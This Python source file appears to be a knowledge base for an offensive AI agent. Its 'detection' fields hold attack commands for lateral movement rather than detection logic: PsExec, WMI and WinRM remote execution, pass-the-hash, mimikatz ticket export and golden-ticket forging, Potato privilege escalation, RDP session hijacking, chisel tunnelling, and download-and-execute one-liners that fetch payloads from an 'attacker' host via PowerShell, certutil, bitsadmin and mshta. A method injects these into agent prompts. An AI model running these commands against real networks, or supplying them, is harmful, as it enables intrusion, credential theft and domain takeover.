"""Lateral movement knowledge base.

Deep knowledge about lateral movement techniques:
1. Remote execution methods (WMI, WinRM, PsExec, SSH)
2. Pass-the-hash / Pass-the-ticket
3. Token impersonation
4. Pivoting and tunneling
5. Living-off-the-land binaries
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class LateralPattern:
    """A lateral movement pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "critical"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "category": self.category[:12],
        }


LATERAL_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "lat-001", "name": "Remote Execution Methods",
        "category": "remote_exec", "severity": "critical",
        "desc": "Remote code execution techniques for lateral movement.",
        "detection": (
            "REMOTE EXECUTION METHODS:\n"
            "PSEXEC:\n"
            "  # Sysinternals PsExec\n"
            "  psexec.py target.com/user:password@<target> cmd.exe\n"
            "  # Requires: Admin access, SMB (445)\n"
            "  # Creates service, uploads binary\n"
            "WMI:\n"
            "  # Windows Management Instrumentation\n"
            "  wmiexec.py target.com/user:password@<target>\n"
            "  # Semi-interactive shell via WMI\n"
            "  # Requires: Admin access, WMI (135+dynamic)\n"
            "WINRM:\n"
            "  # Windows Remote Management\n"
            "  evil-winrm -i <target> -u user -p password\n"
            "  # PowerShell remoting\n"
            "  # Requires: WinRM enabled (5985/5986)\n"
            "DCOM:\n"
            "  # Distributed COM\n"
            "  dcomexec.py target.com/user:password@<target>\n"
            "  # Uses MMC20, ShellWindows, ShellBrowserWindow\n"
            "SSH:\n"
            "  ssh user@<target>\n"
            "  # Key-based: ssh -i key.pem user@target\n"
            "  # Port forwarding: ssh -L 8080:internal:80 user@pivot\n"
            "RDP:\n"
            "  xfreerdp /v:<target> /u:user /p:password\n"
            "  # Restricted admin: Pass-the-hash via RDP\n"
            "SMBEXEC:\n"
            "  smbexec.py target.com/user:password@<target>"
        ),
        "tools": ["impacket", "evil-winrm", "crackmapexec"],
    },
    {
        "id": "lat-002", "name": "Pass-the-Hash / Ticket",
        "category": "credential_reuse", "severity": "critical",
        "desc": "Credential reuse techniques (PtH, PtT, overpass-the-hash).",
        "detection": (
            "PASS-THE-HASH / TICKET:\n"
            "PASS-THE-HASH (PtH):\n"
            "  # Use NTLM hash without knowing password\n"
            "  crackmapexec smb <target> -u user -H <hash>\n"
            "  psexec.py -hashes :<hash> user@<target>\n"
            "  wmiexec.py -hashes :<hash> user@<target>\n"
            "  evil-winrm -i <target> -u user -H <hash>\n"
            "  # Requires: NTLM hash, admin or local admin\n"
            "PASS-THE-TICKET (PtT):\n"
            "  # Inject Kerberos ticket\n"
            "  # Export ticket\n"
            "  mimikatz> sekurlsa::tickets /export\n"
            "  # Inject ticket\n"
            "  mimikatz> kerberos::ptt ticket.kirbi\n"
            "  # Linux: export KRB5CCNAME=ticket.ccache\n"
            "  impacket-getTGT -hashes :<hash> domain/user\n"
            "  export KRB5CCNAME=user.ccache\n"
            "  psexec.py -k -no-pass target.com/user@<target>\n"
            "OVERPASS-THE-HASH:\n"
            "  # Convert NTLM hash to Kerberos ticket\n"
            "  mimikatz> sekurlsa::pth /user:admin /ntlm:<hash> /run:cmd\n"
            "  # Then use Kerberos-based tools\n"
            "SILVER TICKET:\n"
            "  # Forge service ticket using service account hash\n"
            "  mimikatz> kerberos::golden /sid:<SID> /domain:target.com "
            "/target:<server> /service:<service> /rc4:<hash> /user:admin\n"
            "GOLDEN TICKET:\n"
            "  # Forge TGT using KRBTGT hash = domain-wide access\n"
            "  mimikatz> kerberos::golden /domain:target.com /sid:<SID> "
            "/krbtgt:<hash> /user:admin"
        ),
        "tools": ["mimikatz", "impacket", "crackmapexec"],
    },
    {
        "id": "lat-003", "name": "Token and Session Hijacking",
        "category": "token", "severity": "critical",
        "desc": "Token impersonation and session hijacking.",
        "detection": (
            "TOKEN AND SESSION HIJACKING:\n"
            "TOKEN IMPERSONATION:\n"
            "  # Windows tokens represent user security context\n"
            "  # SeImpersonatePrivilege required\n"
            "  # Potato attacks (local priv esc to SYSTEM)\n"
            "  JuicyPotato.exe -l 1337 -p cmd.exe -t *\n"
            "  PrintSpoofer.exe -i -c cmd.exe\n"
            "  GodPotato.exe -cmd cmd.exe\n"
            "  # From SYSTEM, impersonate any logged-on user\n"
            "  # Incognito (Meterpreter)\n"
            "  load incognito\n"
            "  list_tokens -u\n"
            "  impersonate_token 'DOMAIN\\user'\n"
            "KERBEROS DELEGATION:\n"
            "  # Unconstrained delegation\n"
            "  # Server can impersonate any user to any service\n"
            "  # Constrained delegation\n"
            "  # Server can impersonate users to specific services\n"
            "  # Resource-based constrained delegation (RBCD)\n"
            "  # Attacker controls msDS-AllowedToActOnBehalfOfOtherIdentity\n"
            "  impacket-rbcd -delegate-to '<target>$' -delegate-from '<attacker>$' -action write 'target.com/user:pass'\n"
            "SESSION HIJACKING:\n"
            "  # RDP session hijacking (SYSTEM required)\n"
            "  query user  # List sessions\n"
            "  tscon <session_id> /dest:console  # Hijack session"
        ),
        "tools": ["mimikatz", "impacket", "rubeus"],
    },
    {
        "id": "lat-004", "name": "Pivoting and Tunneling",
        "category": "pivot", "severity": "high",
        "desc": "Network pivoting and tunneling techniques.",
        "detection": (
            "PIVOTING AND TUNNELING:\n"
            "SSH TUNNELING:\n"
            "  # Local port forward\n"
            "  ssh -L 8080:internal.target:80 user@pivot\n"
            "  # Dynamic SOCKS proxy\n"
            "  ssh -D 1080 user@pivot\n"
            "  proxychains nmap <internal-target>\n"
            "  # Remote port forward (reverse)\n"
            "  ssh -R 8080:localhost:80 user@attacker\n"
            "CHISEL:\n"
            "  # Server (attacker)\n"
            "  chisel server --reverse -p 8000\n"
            "  # Client (pivot)\n"
            "  chisel client attacker:8000 R:socks\n"
            "  # Then: proxychains nmap <internal>\n"
            "LIGOLO-NG:\n"
            "  # Server (attacker)\n"
            "  proxy -selfcert\n"
            "  # Client (pivot)\n"
            "  agent -connect attacker:11601 -ignore-cert\n"
            "  # Creates TUN interface on attacker\n"
            "  # No SOCKS needed, direct routing\n"
            "METASPLOIT:\n"
            "  # autoroute\n"
            "  run autoroute -s <internal-subnet>\n"
            "  # socks_proxy\n"
            "  use auxiliary/server/socks_proxy\n"
            "  set SRVPORT 1080\n"
            "  run\n"
            "  # Then: proxychains <tool>\n"
            "DOUBLE PIVOTING:\n"
            "  # Chain: Attacker → Pivot1 → Pivot2 → Target\n"
            "  # SSH through multiple hops\n"
            "  ssh -J user@pivot1 user@pivot2"
        ),
        "tools": ["chisel", "ligolo-ng", "proxychains"],
    },
    {
        "id": "lat-005", "name": "Living-off-the-Land",
        "category": "lotl", "severity": "high",
        "desc": "Using legitimate system tools for lateral movement.",
        "detection": (
            "LIVING-OFF-THE-LAND (LOL):\n"
            "POWERSHELL:\n"
            "  # Remote execution\n"
            "  Invoke-Command -ComputerName <target> -ScriptBlock { whoami }\n"
            "  Enter-PSSession -ComputerName <target>\n"
            "  # Download and execute\n"
            "  IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')\n"
            "  # AMSI bypass + execution\n"
            "WMIC:\n"
            "  wmic /node:<target> process call create 'cmd /c whoami'\n"
            "  # Remote process execution\n"
            "SCHTASKS:\n"
            "  schtasks /create /s <target> /tn task /tr cmd.exe /sc once /st 00:00\n"
            "  schtasks /run /s <target> /tn task\n"
            "SC:\n"
            "  sc \\\\<target> create svcname binpath= 'cmd /c whoami'\n"
            "  sc \\\\<target> start svcname\n"
            "BITSADMIN:\n"
            "  bitsadmin /transfer job http://attacker/payload C:\\payload.exe\n"
            "CERTUTIL:\n"
            "  certutil -urlcache -split -f http://attacker/payload.exe C:\\payload.exe\n"
            "MSHTA:\n"
            "  mshta http://attacker/payload.hta\n"
            "RUNDLL32:\n"
            "  rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"\n"
            "LOLBAS:\n"
            "  # Full list: https://lolbas-project.github.io/\n"
            "  # GTFOBins (Linux): https://gtfobins.github.io/"
        ),
        "tools": ["powershell", "certutil"],
    },
]


class LateralMovementKB:
    """Lateral movement knowledge base.

    Provides lateral movement techniques
    injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, LateralPattern] = {}
        self._log = logger.bind(component="lateral_movement_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load lateral movement patterns."""
        for data in LATERAL_PATTERNS:
            pattern = LateralPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "critical"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_category(self, category: str) -> list[LateralPattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category.lower() == category.lower()
        ]

    def build_lateral_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build lateral movement prompt."""
        lines = ["## Lateral Movement Techniques\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_category": cat_counts,
        }
